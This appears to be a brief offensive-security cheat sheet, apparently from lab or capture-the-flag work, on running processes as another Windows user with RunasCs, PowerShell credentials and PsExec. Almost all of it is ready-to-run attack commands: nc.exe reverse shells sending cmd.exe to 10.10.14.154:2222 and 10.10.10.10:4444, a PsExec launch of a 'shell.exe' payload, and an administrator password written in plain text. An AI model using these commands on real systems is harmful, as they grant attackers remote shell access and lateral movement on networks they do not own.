Using RunasCs.exe 

```bash
RunasCs.exe administrator s67u84zKq8IXw "cmd /c c:\tmp\nc.exe 10.10.14.154 2222 -e cmd.exe"
```

Using PowerShell:

```bash
$user = "DOMAIN\username"
$plainPassword = "Password123" 
$securePassword = ConvertTo-SecureString $plainPassword -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($user, $securePassword)

Start-Process -FilePath "C:\Path\To\Program.exe" -Credential $cred
```

Using PowerShell with arguments:

```bash
$user = "DOMAIN\username"
$plainPassword = "Password123" 
$securePassword = ConvertTo-SecureString $plainPassword -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($user, $securePassword)

# Define path to nc.exe
$exePath = "C:\windows\tasks\nc.exe"

# Define arguments (e.g., reverse shell to 10.10.10.10:4444)
$args = "10.10.10.10 4444 -e cmd.exe"

# Start process as specified user
Start-Process -FilePath $exePath -ArgumentList $args -Credential $cred
```

Using PsExec.exe:

```bash
.\PsExec64.exe -accepteula -u DOMAIN\USER -p Password123 "C:\windows\tasks\shell.exe"
```